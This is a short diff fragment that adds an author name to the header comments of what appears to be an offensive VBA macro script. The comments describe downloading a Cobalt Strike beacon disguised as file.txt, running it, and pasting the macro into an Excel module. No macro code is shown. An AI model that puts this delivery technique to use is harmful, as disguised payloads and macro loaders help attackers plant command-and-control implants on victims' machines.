@@ -1,3 +1,4 @@
+' Chris Sikes
 ' Download beacon saved as file.txt instead of .exe, and execute the file.txt to run a beacon
 ' Create an excel document. Alt F11 to open Microsoft VBA, and then right click Insert > Module.
 ' Paste the following VBA script into the module. Create an x64 stageless exe in Cobalt Strike.
